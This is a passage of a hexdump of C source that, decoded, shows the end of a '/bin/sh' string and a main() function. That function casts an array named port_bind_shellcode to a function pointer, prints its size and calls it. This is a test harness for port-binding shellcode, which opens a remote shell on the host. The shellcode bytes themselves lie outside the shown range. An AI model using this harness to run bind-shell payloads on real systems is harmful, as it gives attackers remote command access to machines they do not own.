00001220  62 69 6e 2f 73 68 22 3b  0d 0a 0d 0a 69 6e 74 20  |bin/sh";....int |
00001230  6d 61 69 6e 28 29 0d 0a  7b 0d 0a 20 20 20 20 76  |main()..{..    v|
00001240  6f 69 64 20 28 2a 70 29  28 76 6f 69 64 29 3b 0d  |oid (*p)(void);.|
00001250  0a 20 20 20 20 70 20 3d  20 70 6f 72 74 5f 62 69  |.    p = port_bi|
00001260  6e 64 5f 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 20  |nd_shellcode;.. |
00001270  20 20 20 70 72 69 6e 74  66 28 22 73 68 65 6c 6c  |   printf("shell|
00001280  63 6f 64 65 20 73 69 7a  65 20 25 64 5c 6e 22 2c  |code size %d\n",|
00001290  20 73 69 7a 65 6f 66 28  70 6f 72 74 5f 62 69 6e  | sizeof(port_bin|
000012a0  64 5f 73 68 65 6c 6c 63  6f 64 65 29 29 3b 0d 0a  |d_shellcode));..|
000012b0  20 20 20 20 70 28 29 3b  0d 0a 0d 0a 20 20 20 20  |    p();....    |
000012c0  72 65 74 75 72 6e 20 30  3b 0d 0a 7d              |return 0;..}|
000012cc
